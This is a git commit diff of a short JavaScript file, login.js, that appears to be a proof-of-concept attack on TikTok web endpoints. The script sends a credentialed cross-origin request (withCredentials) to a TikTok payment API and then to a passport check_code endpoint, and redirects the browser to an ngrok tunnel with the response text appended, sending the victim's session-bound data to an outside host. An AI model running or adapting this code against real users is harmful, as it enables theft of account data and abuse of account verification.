1c80972caca64fa39264aeff30342a2640c2ee70
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-09-04 01:18:57 +0700

    Update login.js

--- login.js
+++ login.js
@@ -1,10 +1,10 @@
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
-xhr.open("GET", "https://fp.us.tiktokv.com/pipo_fe/checkout/payment_api/payment/v1/get_payment_result?biz_id=ARMAAEoZjpPDfU8EurijAeigjgoL");
+xhr.open("POST", "https://creatormarketplace.tiktok.com/passport/web/mobile/check_code/?aid=2043&account_sdk_source=web&sdk_version=2.1.3-abroad&language=en&verifyFp=verify_lm2k21kf_afHNwSbR_8ntk_4uQ7_AcrK_jEZs5SFJxrvb");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
-xhr.send(null);
+xhr.send('mix_mode=1&mobile=2e33372a2e33373d343c373d3d303c373d35&code=36363532&type=3631&fixed_mix_mode=1');
 
 function reqListener() {
-    window.location='https://2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
+    window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
